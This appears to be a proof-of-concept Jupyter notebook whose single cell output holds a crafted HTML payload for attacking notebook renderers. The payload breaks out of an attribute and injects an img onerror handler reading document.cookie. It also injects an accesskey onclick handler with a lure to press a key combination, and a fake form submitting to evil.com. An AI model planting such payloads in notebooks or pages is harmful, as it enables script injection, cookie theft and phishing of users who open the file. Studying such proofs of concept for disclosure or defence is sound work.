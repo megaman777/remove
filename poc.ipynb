{
  "cells": [
    {
      "metadata": {
        "trusted": true,
        "id": "xrixHi2WtFVN",
        "outputId": "f3bd937a-8435-4d3c-ac18-eb48dcf7e469"
      },
      "cell_type": "code",
      "source": [
        "!whoami"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/plain": "<IPython.core.display.HTML object>",
            "text/html": "'()\">aa<img/src=x/onerror=alert(document.cookie)>\nmegaman%22%20accesskey=x%20onclick=alert(document.domain)%3E%20Please%20press%20(ALT-%3ESHIFT-%3EX)%20to%20search.<form/action=https://evil.com><input type=email><button type=submit><!--"
          },
          "metadata": {}
        }
      ]
    }
  ],
  "metadata": {
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3",
      "language": "python"
    },
    "language_info": {
      "name": "python",
      "version": "3.7.8",
      "mimetype": "text/x-python",
      "codemirror_mode": {
        "name": "ipython",
        "version": 3
      },
      "pygments_lexer": "ipython3",
      "nbconvert_exporter": "python",
      "file_extension": ".py"
    },
    "colab": {
      "provenance": []
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}
